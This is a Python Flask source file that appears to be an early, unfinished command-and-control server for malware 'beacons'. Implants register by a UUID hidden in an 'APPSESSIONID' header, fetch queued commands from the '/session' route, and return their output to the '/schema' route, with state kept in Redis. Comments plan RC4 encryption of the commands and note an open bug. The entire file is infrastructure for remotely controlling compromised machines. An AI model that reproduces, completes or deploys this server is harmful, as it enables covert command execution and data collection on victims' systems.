# beacons checking in supply a UUID that is hashed
# the hash is compared to a precompiled list of them?
# the uuid is stored in memory in a table
# but how are commands stored and retrieved
# maybe the tables are each named after the beacon
# so use postgresql to create a series of tables in a db
# the flask webserver sees the UUID then performs a fetch from the db
# e z p z

from datetime import datetime
from flask import *
import json
import redis  # Make sure to install and start the redis server
# sudo systemctl start redis-server.service
import string

conn = redis.StrictRedis(host='localhost', port=6379, db=0)
app = Flask(__name__)


@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    uuid = request.headers['APPSESSIONID']
    if set(uuid).difference(string.ascii_letters + string.digits):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        # I want to add a way to add the date here...
        # As well as last check in date
        # Lets convert the command struct to a JSON object
        structure = {
            "Command": "0",
            "LastInteraction": "0",
            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "Result": "0"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)
        return ('')


@app.route('/session', methods=['GET'])
def session():
    # This function handles the beacon requesting a command
    if request.method == 'GET':
        uuid = request.headers['APPSESSIONID']
        if set(uuid).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            command = conn.hget('UUID', uuid)  # Get the struct
            command = command.decode()  # Decode it from bytes
            command = json.loads(command)  # it's returned as string so convert it to dict
            structure = json.dumps(command)  # Dump the dict to json
            comm = json.loads(structure)  # Load it into a new var
            Command = comm["Command"]  # Grab the command var from the object
            LastInteraction = comm["LastInteraction"]
            Res = comm["Result"]
            # Set the command to 0
            structure = {
                "Retrieved": "0",  # Reset retrieved so we know the command was picked up
                "Command": "0",
                "LastInteraction": f"{LastInteraction}",
                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                "Result": f"{Res}"
            }
            structure = json.dumps(structure)  # Dump the json
            # Write the message value to the beacon:UUID key
            conn.hset('UUID', uuid, structure)
            return Command  # we've really got to RC4 encrypt this


@app.route("/schema", methods=['GET'])
def schema():
    # This function handles beacons returning data
    # Grab the appsessionid value from the headers
    # CURRENT ISSUE
    # IT'S SENDING TO SCHEMA
    # BUT SCHEMA CAN'T HANDLE CREATING NEW UUIDS
    uuid = request.headers['APPSESSIONID']
    result = request.headers['Res']
    command = conn.hget('UUID', uuid)  # Get the struct
    command = command.decode()  # Decode it from bytes
    command = json.loads(command)  # it's returned as string so convert it to dict
    structure = json.dumps(command)  # Dump the dict to json
    comm = json.loads(structure)  # Load it into a new var
    LastInteraction = comm["LastInteraction"]
    print(request.headers)
    if set(uuid).difference(string.ascii_letters + string.digits):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        # Let's convert the command struct to a JSON object
        structure = {
            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
            "Command": "0",
            "LastInteraction": f"{LastInteraction}",
            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "Result": f"{result}"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)
        return ('')


def serve():
    app.run(host="localhost", port=8000)  # ssl_context='adhoc')


if __name__ == "__main__":
    serve()